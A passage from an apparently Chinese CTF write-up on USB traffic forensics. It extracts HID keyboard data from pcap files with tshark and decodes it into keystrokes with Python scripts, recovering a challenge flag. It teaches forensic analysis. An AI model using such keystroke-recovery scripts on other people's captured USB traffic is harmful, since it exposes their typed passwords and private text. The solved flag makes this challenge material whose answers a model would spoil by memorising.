class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>运行脚本得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard.py                 <br>output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>因为[DEL]是删除键，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>keyboard2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard2.py bingbing.pcapng      <br>666c61677b3866396564326639333365662&lt;DEL&gt;31346138643035323364303334396531323939637d<br>output :666c61677b38663965643266393333656631346138643035323364303334396531323939637d<br></code></pre></td></tr></table></figure><p>使用脚本将十六进制转换为字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>题目2：</strong></p><p><img src="https://img-blog.csdnimg.cn/20210405115616535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt内容<br><img src="https://img-blog.csdnimg.cn/20210405120456614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是找到的第三个脚本<a href="https://github.com/WangYihang/UsbKeyboardDataHacker/blob/master/UsbKeyboardDataHacker.py">UsbKeyboardDataHacker.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span 